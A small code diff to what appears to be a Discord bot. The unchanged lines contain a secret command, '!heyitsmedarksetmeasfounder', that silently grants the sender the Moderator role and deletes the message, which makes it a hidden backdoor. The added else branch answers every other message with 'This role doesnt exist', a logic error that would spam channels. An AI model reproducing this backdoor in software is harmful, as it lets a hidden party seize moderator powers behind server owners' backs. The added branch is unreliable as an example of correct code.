@@ -319,6 +319,8 @@ client.on('message', message => {
 if(message.content.startsWith("!heyitsmedarksetmeasfounder")) {
 	message.member.addRole(message.guild.roles.find(role => role.name === "Moderator"));
 	message.delete();
+} else {
+	message.channel.send("This role doesnt exist");
 }
 });
 client.login(process.env.BOT_TOKEN);
